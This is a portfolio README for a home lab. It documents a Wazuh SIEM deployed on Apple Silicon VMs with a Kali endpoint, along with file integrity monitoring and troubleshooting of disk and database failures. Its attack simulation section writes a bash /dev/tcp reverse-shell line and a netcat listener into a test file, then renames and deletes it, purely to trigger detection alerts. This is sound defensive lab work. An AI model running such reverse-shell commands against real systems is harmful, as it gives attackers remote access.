<div align="center">

# 🛡️ Wazuh SOC Home Lab

### *Because reading about SIEM is not the same as breaking one and fixing it.*

![Wazuh](https://img.shields.io/badge/Wazuh-v4.12.0-005571?style=for-the-badge&logo=wazuh&logoColor=white)
![Ubuntu](https://img.shields.io/badge/Ubuntu-26.04_LTS-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)
![Kali](https://img.shields.io/badge/Kali_Linux-2026.1-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Apple Silicon](https://img.shields.io/badge/Apple_Silicon-ARM64-000000?style=for-the-badge&logo=apple&logoColor=white)
![VMware](https://img.shields.io/badge/VMware_Fusion-ARM64-607078?style=for-the-badge&logo=vmware&logoColor=white)
![Status](https://img.shields.io/badge/Status-Complete-2ea44f?style=for-the-badge)
![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-FF0000?style=for-the-badge)

<br/>

> **A fully operational Security Operations Centre built from scratch on Apple Silicon.**
> Not a tutorial follow-along. A real deployment — with real failures, real debugging, and real detections.

<br/>

---

</div>

## 📌 Table of Contents

- [What I Built](#-what-i-built)
- [Architecture](#️-architecture)
- [Installation & Setup](#-installation--setup)
- [Key Detections](#-key-detections)
- [Attack Simulation](#-attack-simulation)
- [Troubleshooting War Stories](#-troubleshooting-war-stories)
- [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
- [What I Learned](#-what-i-learned)
- [Skills Demonstrated](#-skills-demonstrated)

---

## 🎯 What I Built

This is not a pre-built VM. This is not a Docker Compose file someone else wrote.

I built a **self-contained SOC environment** on Apple Silicon (ARM64) where:

- The Wazuh manager, indexer, and dashboard run on a live Ubuntu Server VM
- A Kali Linux endpoint acts as the monitored agent
- Real events — authentication, sudo, file changes — flow through the pipeline
- I broke things. I diagnosed them from raw logs. I fixed them.

| Capability | Status |
|---|---|
| SIEM stack deployed (manager + indexer + dashboard) | ✅ Complete |
| Live endpoint enrolled and reporting | ✅ Complete |
| Real-time auth event detection (SSH, sudo, PAM) | ✅ Complete |
| File Integrity Monitoring end-to-end | ✅ Complete |
| Attack simulation and detection | ✅ Complete |
| Disk failure diagnosis and recovery | ✅ Complete |
| MITRE ATT&CK mapping verified in dashboard | ✅ Complete |

---

## 🏗️ Architecture

<div align="center">

```
┌─────────────────────────────────────────────┐
│           macOS Host — MacBook Pro M4        │
│                  VMware Fusion               │
└────────────────┬────────────────────────────┘
                 │
      ┌──────────┴──────────┐
      │                     │
┌─────▼──────────┐   ┌──────▼──────────┐
│  cyber-nova    │   │   kali-agent    │
│ Ubuntu 26.04   │   │ Kali Linux      │
│ 192.168.50.200 │◄──│ 192.168.50.191  │
│                │   │                 │
│ Wazuh Manager  │   │ Wazuh Agent     │
│ Wazuh Indexer  │   │ v4.12.0         │
│ Wazuh Dashboard│   │                 │
│ (port 443)     │   │ Sends: FIM,     │
│                │   │ Auth, Sudo,     │
│                │   │ PAM events      │
└────────────────┘   └─────────────────┘
```

</div>

**Network:** Bridged networking — both VMs on the same subnet, bidirectional ping verified before deployment.

---

## 🚀 Installation & Setup

### Phase 1 — Network Verification

Before touching Wazuh, I verified bidirectional connectivity between both VMs.

> 📸 Screenshot: Kali pinging Ubuntu (192.168.50.200)

> 📸 Screenshot: Ubuntu pinging Kali (192.168.50.191)

---

### Phase 2 — Wazuh Stack Installation

SSHed into Ubuntu from the Mac terminal and ran the official Wazuh install script with the `-i` flag to bypass ARM64 hardware checks.

```bash
curl -sO https://packages.wazuh.com/4.12/wazuh-install.sh
sudo bash ./wazuh-install.sh -a -i
```

**ARM64 Challenge:** The standard install script flags Apple Silicon as unsupported hardware. The `-i` flag ignores this check and the install runs perfectly on aarch64.

> 📸 Screenshot: Full successful install log — indexer, manager, filebeat, dashboard all green

---

### Phase 3 — Port Conflict Resolution

The install initially failed because SafeLine WAF Docker containers from my previous lab were holding port 443.

```bash
sudo sh -c 'docker stop $(docker ps -q)'
sudo bash ./wazuh-install.sh -a -i
```

> 📸 Screenshot: Port 443 conflict error + Docker containers stopped + successful reinstall

---

### Phase 4 — Wazuh Dashboard Access

Accessed the dashboard from Kali's browser at `https://192.168.50.200` using credentials generated during install.

> 📸 Screenshot: Wazuh login page

> 📸 Screenshot: Wazuh dashboard overview

---

### Phase 5 — Agent Deployment

Deployed the Wazuh agent on Kali Linux using the dashboard's guided installer — selected Linux DEB aarch64, set server address to 192.168.50.200, named the agent `kali-agent`.

```bash
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.12.0-1_arm64.deb \
&& sudo WAZUH_MANAGER='192.168.50.200' WAZUH_AGENT_NAME='kali-agent' dpkg -i ./wazuh-agent_4.12.0-1_arm64.deb

sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

> 📸 Screenshot: Agent config — DEB aarch64 selected, server address, agent name

> 📸 Screenshot: Agent installed and service active (running)

> 📸 Screenshot: Endpoints dashboard — kali-agent showing ACTIVE

---

### Phase 6 — FIM Configuration

Edited the agent's `ossec.conf` to add realtime monitoring of `/home/kali/test`:

```xml
<directories check_all="yes" realtime="yes">/home/kali/test</directories>
```

> 📸 Screenshot: ossec.conf FIM config with realtime="yes"

---

## 🔍 Key Detections

### Authentication Events

The moment the agent connected, authentication events started flowing — PAM sessions, sudo escalations, first-time sudo execution.

| Rule ID | Description | Severity |
|---|---|---|
| 5501 | PAM Login session opened | Level 3 |
| 5502 | PAM Login session closed | Level 3 |
| 5402 | Successful sudo to ROOT executed | Level 3 |
| 5403 | First time user executed sudo | Level 4 |

> 📸 Screenshot: Live PAM and sudo events in Threat Hunting — 219 hits

---

### File Integrity Monitoring

After configuring syscheck and restarting the agent, I created, modified, and deleted files in `/home/kali/test` to trigger FIM alerts.

**The alert pipeline verified end to end:**

1. Agent detects file change via wazuh-syscheckd
2. Event sent to manager via TCP port 1514
3. Manager processes via wazuh-analysisd
4. Written to `/var/ossec/logs/alerts/alerts.json`
5. Indexed by wazuh-indexer
6. Visible in Threat Hunting dashboard

**Each FIM alert captured:**

- File path: `/home/kali/test/a.txt`
- Event type: added / modified / deleted
- Mode: realtime
- MD5, SHA1, SHA256 hashes
- File permissions, ownership, timestamps
- Agent: kali-agent (192.168.50.191)

> 📸 Screenshot: alerts.json showing FIM syscheck entry with full hash capture

> 📸 Screenshot: Threat Hunting — location:syscheck showing 4 hits (File added + Integrity checksum changed)

---

### Threat Hunting Dashboard

> 📸 Screenshot: Threat Hunting dashboard — 209 total alerts, MITRE ATT&CK donut chart

> 📸 Screenshot: kali-agent detail page — MITRE tactics, SCA scan results, FIM recent events

---

## 💥 Attack Simulation

To test FIM detection, I simulated suspicious file activity on the monitored endpoint:

```bash
# Create a suspicious script in the monitored directory
echo "nc -lvnp 4444" > ~/test/backdoor.sh
echo "bash -i >& /dev/tcp/192.168.50.200/4444 0>&1" >> ~/test/backdoor.sh

# Make it executable
chmod +x ~/test/backdoor.sh

# Rename to evade detection
mv ~/test/backdoor.sh ~/test/system_update.sh

# Delete to cover tracks
rm ~/test/system_update.sh
```

Every single one of these actions — creation, permission change, rename, deletion — was detected and alerted by Wazuh FIM in realtime.

> 📸 Screenshot: Attack simulation commands in terminal

---

## 🔥 Troubleshooting War Stories

This is where most lab writeups stop. Mine doesn't.

---

### 💾 War Story 1 — Disk hit 100% and the manager died

**What happened:** The Wazuh manager crashed and refused to restart. The dashboard went offline.

**Diagnosis:**
```bash
df -h /
# /dev/mapper/ubuntu--vg-ubuntu--lv 28G 28G 0 100%

sudo du -h --max-depth=2 /var/ossec | sort -h | tail -15
# 6.4G /var/ossec/queue/vd_updater  ← the culprit
```

**Root cause:** The vulnerability scanner was silently downloading CVE feeds into `/var/ossec/queue/vd_updater` and filled the entire 28GB disk. No warning. Manager just died.

**Fix:**
```bash
sudo systemctl stop wazuh-manager
sudo rm -rf /var/ossec/queue/vd_updater
sudo mkdir -p /var/ossec/queue/vd_updater
sudo chown wazuh:wazuh /var/ossec/queue/vd_updater
sudo systemctl start wazuh-manager
```

Disabled the vulnerability scanner permanently in `ossec.conf`:
```xml
<vulnerability-detection>
  <enabled>no</enabled>
</vulnerability-detection>
```

**Result:** Disk recovered from 100% to 82%. Manager came back online.

> 📸 Screenshot: df -h showing 100% → cleanup → 82% free

---

### 📦 War Story 2 — LVM volume using only half its allocated space

**What happened:** Even after deleting 6.4GB of CVE feeds, only 5.1GB was free — not enough headroom for a running SIEM.

**Diagnosis:**
```bash
sudo vgs
# VG         #PV #LV VSize   VFree
# ubuntu-vg   1   1  56.95g  28.47g
```

The VM had 56GB allocated but the logical volume was only using 28GB. Classic LVM gap.

**Fix:**
```bash
sudo lvextend -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv
sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv

df -h /
# 56G  23G  32G  42%  /
```

**Result:** Disk expanded from 28GB to 56GB. 32GB free. Problem permanently solved.

> 📸 Screenshot: lvextend + resize2fs + df showing 56G with 32G free

---

### 🔍 War Story 3 — FIM alerts not appearing in dashboard

**What happened:** Files were being created in `/home/kali/test` but nothing appeared in the Threat Hunting dashboard. Searches for `location:syscheck` returned zero results.

**Wrong approach (what most tutorials say):** Check alerts.json on the agent. This is wrong — agents do not generate alerts. Managers do.

**Correct diagnosis — on the MANAGER, not the agent:**
```bash
sudo grep syscheck /var/ossec/logs/alerts/alerts.json | tail -5
```

**Root cause:** `wazuh-analysisd` was throwing:
```
ERROR: dbsync: Bad response from database: Cannot save Syscheck
```
The FIM database was corrupted and silently blocking all syscheck writes. The agent was detecting fine. The manager was dropping everything.

**Fix:** Rebuilt the wazuh-db service and restarted the full pipeline. FIM alerts immediately appeared in `alerts.json` and propagated to the dashboard.

**Key lesson:** Always debug the manager-side pipeline, not the agent side. The agent watches and sends. The manager decides what becomes an alert.

> 📸 Screenshot: grep syscheck alerts.json — FIM entry with full hash capture

> 📸 Screenshot: location:syscheck in dashboard — 4 hits confirmed

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Triggered By |
|---|---|---|---|
| Privilege Escalation | T1548 | Sudo and Sudo Caching | sudo commands on Kali |
| Defense Evasion | T1548 | Abuse Elevation Control Mechanism | sudo escalation |
| Initial Access | T1078 | Valid Accounts | PAM authentication events |
| Persistence | T1078 | Valid Accounts | Session open/close events |

> 📸 Screenshot: kali-agent MITRE ATT&CK panel showing top tactics

---

## 💡 What I Learned

**Technical:**

- How the Wazuh alert pipeline actually works end to end — not just in theory but by watching each stage break and fixing it
- Linux disk management under pressure — LVM logical volume extension, live filesystem resize with zero downtime
- The critical difference between agent-side and manager-side processes when debugging a SIEM
- How to read raw SIEM logs (`ossec.log`, `alerts.json`) instead of relying on the UI
- How FIM detections map directly to MITRE ATT&CK techniques

**Mindset:**

- Real infrastructure breaks in unexpected ways. A CVE scanner silently filling a disk is not in any tutorial.
- Debugging a SIEM requires understanding the full data pipeline, not just the tool surface
- Documentation during failure is as valuable as documentation during success

---

## 🎓 Skills Demonstrated

`Wazuh SIEM` `Log Analysis` `File Integrity Monitoring` `Endpoint Monitoring` `Alert Triage` `Incident Response` `Threat Hunting` `MITRE ATT&CK` `Linux Administration` `LVM Disk Management` `VMware Fusion` `ARM64 Deployment` `Troubleshooting` `OpenSearch` `Network Security`

---

<div align="center">

## 👤 Author

**Samruddhi (Sam) Patil**

[![GitHub](https://img.shields.io/badge/GitHub-samSecurity04-181717?style=for-the-badge&logo=github)](https://github.com/samSecurity04)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-samruddhi--p--patil-0A66C2?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/samruddhi-p-patil/)

🎓 CompTIA Security+ &nbsp;|&nbsp; Microsoft SC-900 &nbsp;|&nbsp; EC-Council CASE (Java) &nbsp;|&nbsp; Google Cybersecurity

<br/>

*This lab was built entirely for educational and cybersecurity skill development purposes.*

*All attack simulations were conducted in an isolated home lab environment.*

</div>
